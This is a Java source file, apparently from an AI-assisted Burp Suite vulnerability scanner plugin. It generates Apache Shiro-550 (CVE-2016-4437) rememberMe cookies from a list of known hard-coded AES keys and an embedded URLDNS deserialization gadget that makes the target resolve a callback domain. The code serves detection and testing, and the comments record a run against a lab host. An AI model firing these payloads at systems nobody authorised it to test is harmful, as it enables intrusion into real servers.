/*
 * Zack-AI-Scanner —— Burp Suite 的 AI 智能漏洞扫描插件
 * Copyright (C) 2026 Zack AI Scanner
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
package com.zackai.core;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Shiro rememberMe 载荷生成（Shiro-550 / CVE-2016-4437）。
 *
 * <p>为什么必须由代码生成：这个载荷不是一个字符串，而是
 * {@code Base64( IV(16字节) ‖ AES-CBC(PKCS5Padding, 密钥, IV, 序列化流) )} ——
 * 里面的序列化流要带上本次请求的回连域名，模型既不能做 AES、也不能拼 Java 序列化字节。
 * 所以提示词里让模型只写标记 {@code {{SHIRO_URLLDNS:<密钥>}}}（每条载荷换一个常见硬编码密钥），
 * 发送前由 {@link #expand} 展开成真正的 cookie 值；展开失败时原样返回，不会误报。
 *
 * <p>gadget 是 URLDNS 而不是命令执行链：它只让目标做一次 DNS 解析（解析我们这次请求的
 * 专属域名），不执行任何代码 —— 回连记录既证明「密钥猜对了」，也证明「反序列化被执行了」，
 * 这已经足够判定漏洞存在，且对目标无副作用。真的打命令链需要自己起 JRMP/LDAP 服务，不在本工具范围。
 *
 * <p>模板的来历：用 {@code ObjectOutputStream} 序列化一个 {@code HashMap<URL,String>}，
 * 其中 URL 的 {@code hashCode} 字段被刻意置为 -1（ysoserial URLDNS 的经典手法）——
 * 目标端 {@code HashMap.readObject} 会重新计算哈希，从而在**反序列化的那一刻**解析域名。
 * 生成时需要反射改 {@code java.net.URL.hashCode}（JDK 17+ 要 --add-opens），所以模板固化成
 * 下面的 Base64；只需要把占位符域名换成真实域名（长度前缀跟着改），
 * {@code ShiroHarness} 会离线反序列化验证替换后的字节流仍然有效。
 */
public final class ShiroPayload {

    /** 载荷里的标记：模型写成 {{SHIRO_URLLDNS:<AES密钥>}}，发送前展开成真正的 rememberMe 值 */
    public static final String MARKER_PREFIX = "{{SHIRO_URLLDNS:";
    private static final String MARKER_SUFFIX = "}}";

    /**
     * 常见硬编码 rememberMe 密钥（公开的 Shiro 漏洞与利用工具里反复出现的那些）。
     * 密钥猜对才能解密，所以每条载荷换一个 —— 猜中任何一条都会有回连记录。
     */
    private static final String[] DEFAULT_KEYS = {
            "kPH+bIxk5D2deZiIxcaaaA==",
            "2AvVhdsgUs0FSA3SDFAdag==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "bWljcm9zAAAAAAAAAAAAAA==",
            "wGiHplamyXlVB11UXWol8g==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "ZUdsaGJuSmxibVI2ZHc9PQ=="
    };

    /**
     * URLDNS gadget 模板（258 字节）：HashMap&lt;URL("http://oob.invalid/x"), String&gt;，
     * URL 的 hashCode 字段是 -1。占位符域名见 {@link #PLACEHOLDER_HOST}。
     */
    private static final String GADGET_TEMPLATE_BASE64 =
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw"
            + "P0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0"
            + "TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJv"
            + "dG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAC29vYi5pbnZhbGlkdAACL3hxAH4ABXQABGh0dHBw"
            + "eHQAAXh4";

    /** 模板里占位符域名（长度前缀紧挨在它前面 2 字节） */
    static final String PLACEHOLDER_HOST = OASTClient.PLACEHOLDER;

    /** 占位符域名在模板里的偏移（字节），{@code ShiroHarness} 会断言它没有漂移 */
    static final int TEMPLATE_HOST_OFFSET = 223;

    private ShiroPayload() {
    }

    /** 常见密钥列表（副本，避免调用方改到内部数组） */
    public static String[] defaultKeys() {
        return DEFAULT_KEYS.clone();
    }

    /** 载荷里是否带 Shiro 生成标记 */
    public static boolean hasMarker(String payload) {
        return payload != null && payload.contains(MARKER_PREFIX);
    }

    /**
     * 把标记载荷展开成真正的 rememberMe 值（AES-CBC + Base64）。
     *
     * <p>不是标记载荷、密钥不是合法 Base64、密钥长度不是 16 字节、或没拿到回连域名时，
     * 一律原样返回 —— 宁可发一条无效载荷，也不能把半成品当成攻击载荷发出去。
     *
     * @param payload 模型生成的载荷，可含 {@code rememberMe=} 前缀，也可以只是标记本身
     * @param host    本次请求的回连域名（已带随机前缀）
     */
    public static String expand(String payload, String host) {
        if (!hasMarker(payload) || host == null || host.isEmpty()) return payload;
        String text = payload;
        int at;
        while ((at = text.indexOf(MARKER_PREFIX)) >= 0) {
            int end = text.indexOf(MARKER_SUFFIX, at + MARKER_PREFIX.length());
            if (end < 0) return payload;
            String key = text.substring(at + MARKER_PREFIX.length(), end).trim();
            String value = rememberMeValue(host, key);
            if (value == null) return payload;
            text = text.substring(0, at) + value + text.substring(end + MARKER_SUFFIX.length());
        }
        return text;
    }

    /**
     * 生成 rememberMe cookie 的值：{@code Base64(AES-CBC(URLDNS gadget))}。
     * 密钥非法时返回 null。
     */
    public static String rememberMeValue(String host, String keyBase64) {
        byte[] key;
        try {
            key = Base64.getDecoder().decode(keyBase64);
        }
        catch (Exception e) {
            return null;
        }
        if (key.length != 16) return null;
        try {
            byte[] cipher = aesCbcEncrypt(key, urlDnsGadget(host));
            return cipher == null ? null : Base64.getEncoder().encodeToString(cipher);
        }
        catch (Exception e) {
            return null;
        }
    }

    /**
     * 把 gadget 模板里的占位符域名换成真实域名（同时改写 2 字节长度前缀）。
     * 包内可见，便于离线验证反序列化结果。
     */
    static byte[] urlDnsGadget(String host) {
        byte[] template = Base64.getDecoder().decode(GADGET_TEMPLATE_BASE64);
        byte[] placeholder = PLACEHOLDER_HOST.getBytes(StandardCharsets.UTF_8);
        int at = indexOf(template, placeholder);
        if (at < 0) return null;
        byte[] hostBytes = host.getBytes(StandardCharsets.UTF_8);
        ByteArrayOutputStream out = new ByteArrayOutputStream(template.length + hostBytes.length);
        out.write(template, 0, at - 2);                          // 占位符前面的 2 字节是长度前缀，丢掉
        out.write((hostBytes.length >> 8) & 0xFF);
        out.write(hostBytes.length & 0xFF);
        out.write(hostBytes, 0, hostBytes.length);
        out.write(template, at + placeholder.length, template.length - at - placeholder.length);
        return out.toByteArray();
    }

    /**
     * AES/CBC/PKCS5Padding，输出是 <b>IV(16 字节) ‖ 密文</b> —— 这个前缀不是可选的。
     *
     * <p>Shiro 的 {@code JcaCipherService} 默认 {@code generateInitializationVectors = true}，
     * 解密时**把输入的前 16 字节当成 IV**，剩下的才当密文。只发密文的话，Shiro 会拿我们密文的
     * 前 16 字节当 IV → 解出垃圾 → 反序列化失败 → 载荷永远不生效。
     *
     * <p>这个 bug 在插件里存活了很久：① 与网络和密钥都无关，任何目标、任何密钥都发不出去；
     * ② 旧的 ShiroHarness 用**同一套约定**（IV=key、只取密文）反向解密来自证，于是永远测不出来。
     * 现在 harness 改成按 Shiro 的方式解（前 16 字节当 IV），并把「前 16 字节 == 密钥」写成断言。
     *
     * <p>实测（2026-09-22，靶场 192.168.52.128:17655，密钥 kPH+bIxk5D2deZiIxcaaaA==）：
     * 只发密文 → 无回连；加上 IV 前缀 → 目标解析我们的域名、回连记录到手。
     */
    static byte[] aesCbcEncrypt(byte[] key, byte[] data) {
        if (data == null) return null;
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            byte[] iv = new byte[16];
            System.arraycopy(key, 0, iv, 0, Math.min(key.length, iv.length));
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
            byte[] cipherText = cipher.doFinal(data);
            byte[] wire = new byte[iv.length + cipherText.length];
            System.arraycopy(iv, 0, wire, 0, iv.length);
            System.arraycopy(cipherText, 0, wire, iv.length, cipherText.length);
            return wire;
        }
        catch (Exception e) {
            return null;
        }
    }

    private static int indexOf(byte[] haystack, byte[] needle) {
        for (int i = 0; i + needle.length <= haystack.length; i++) {
            boolean hit = true;
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    hit = false;
                    break;
                }
            }
            if (hit) return i;
        }
        return -1;
    }
}
